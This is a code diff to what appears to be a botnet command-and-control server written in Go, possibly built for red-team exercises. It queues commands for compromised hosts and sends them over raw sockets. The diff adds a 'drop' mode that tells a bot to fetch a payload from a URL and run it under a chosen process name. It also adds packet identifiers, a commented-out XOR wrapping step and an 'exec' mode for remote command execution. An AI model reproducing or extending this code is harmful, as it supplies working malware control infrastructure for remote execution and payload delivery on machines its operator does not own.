@@ -33,6 +33,7 @@ var targetIP string
 type Task struct {
 	Target string
 	cmd    string
+	cmd2   string
 	mode   string
 }
 
@@ -77,8 +78,9 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 		// Make a socket for sending
 		fd := rawsocket.NewSocket()
 
-		// Create Packet
+		// Create Packet & Command
 		var packet []byte
+		var data string
 
 		/*Check if Packet needs to be sent */
 		queueLen := len(cmdQueue)
@@ -86,19 +88,27 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 			if cmdQueue[i].Target == bot.IP.String() {
 				/* Remove Element from Queue */
 				cmdCurr := cmdQueue[i].cmd
+				cmd2Curr := cmdQueue[i].cmd2
 				cmdType := cmdQueue[i].mode
 				cmdQueue = append(cmdQueue[:i], cmdQueue[i+1:]...)
 				queueLen--
 
+				// Create Data
 				if cmdType == "EXEC" {
-					packet = rawsocket.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, rawsocket.CreateCommand(cmdCurr))
+					data = rawsocket.CreateCommand(cmdCurr)
 
 				} else if cmdType == "DROP" {
-					packet = rawsocket.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, rawsocket.CreateDeploy(cmdCurr))
+					data = rawsocket.CreateDeploy(cmdCurr, cmd2Curr)
 				}
 
+				// Wrap data
+				// data = xorData(data)
+				data = rawsocket.AddIdentifier(data)
+
+				// Send packet
+				packet = rawsocket.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, data)
 				rawsocket.SendPacket(fd, iface, rawsocket.CreateAddrStruct(iface), packet)
-				fmt.Println("[+] Sent DROP :", bot.Hostname, "(", bot.IP, ")")
+				fmt.Println("[+] Sent Command :", bot.Hostname, "(", bot.IP, ")")
 				unix.Close(fd)
 				// updatepwnboard
 			}
@@ -159,7 +169,7 @@ func cli() {
 		case "exec":
 			if targetIP != "" {
 				cmd := tmpCmd[5:]
-				cmdQueue = append(cmdQueue, Task{targetIP, cmd, "EXEC"})
+				cmdQueue = append(cmdQueue, Task{targetIP, cmd, "", "EXEC"})
 				fmt.Printf("[+] Queued EXEC : %v\n", cmd)
 			} else {
 				fmt.Println("\x1b[31m[-] No Target\x1b[0m")
@@ -178,9 +188,17 @@ func cli() {
 			cliList(splitCmd)
 		case "drop":
 			if cmdArgc >= 3 {
-				cmd := tmpCmd[5:]
-				cmdQueue = append(cmdQueue, Task{targetIP, cmd, "DROP"})
-				fmt.Printf("[+] Queued DROP : %v\n", cmd)
+				fmt.Printf("Selected Params:\n   URL : %v\n   Process Name : %v\nConfirm? : ", splitCmd[1], splitCmd[2])
+				var resp string
+				fmt.Scanln(&resp)
+				if resp == "Y" || resp == "y" {
+					cmdQueue = append(cmdQueue, Task{targetIP, splitCmd[1], splitCmd[2], "DROP"})
+					fmt.Printf("[+] Queued DROP : %v %v\n", splitCmd[1], splitCmd[2])
+				} else {
+					fmt.Printf("\x1b[31m[-] Canceled\x1b[0m\n")
+				}
+			} else {
+				fmt.Printf("\x1b[31m[-] Incorrect Syntax\n   Format : drop {url} {process name}\x1b[0m\n")
 			}
 		case "queue":
 			for i := 0; i < len(cmdQueue); i++ {
@@ -188,15 +206,16 @@ func cli() {
 			}
 		case "":
 		default:
-			fmt.Printf("\x1b[31m[-] Unknown Command\n\x1b[0m")
+			fmt.Printf("\x1b[31m[-] Unknown Command\x1b[0m\n")
 		}
 		tmpCmd = ""
 	}
 }
 
 func processPacket(packet gopacket.Packet, listen chan Host) {
-	// Get data from packet
+	// Get data from packet & Remove Identifier
 	data := string(packet.ApplicationLayer().Payload())
+	data = rawsocket.RemoveIdentifier(data)
 	payload := strings.Split(data, " ")
 
 	// fmt.Println("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())
@@ -250,7 +269,7 @@ func main() {
 	listen := make(chan Host, 5)
 
 	// Iface and myip for the sendcommand func to use
-	iface, myIP := rawsocket.GetOutwardIface("192.168.56.10:80")
+	iface, myIP := rawsocket.GetOutwardIface("192.168.1.207:80")
 	fmt.Println("[+] Interface:", iface.Name)
 
 	dstMAC, err := rawsocket.GetRouterMAC()
@@ -266,7 +285,7 @@ func main() {
 	go cli()
 
 	for {
-		packet := rawsocket.ServerReadPacket(readfd, vm)
+		packet := rawsocket.BothReadPacket(readfd, vm)
 		// Pass Packet to process function
 		if packet != nil {
 			go processPacket(packet, listen)
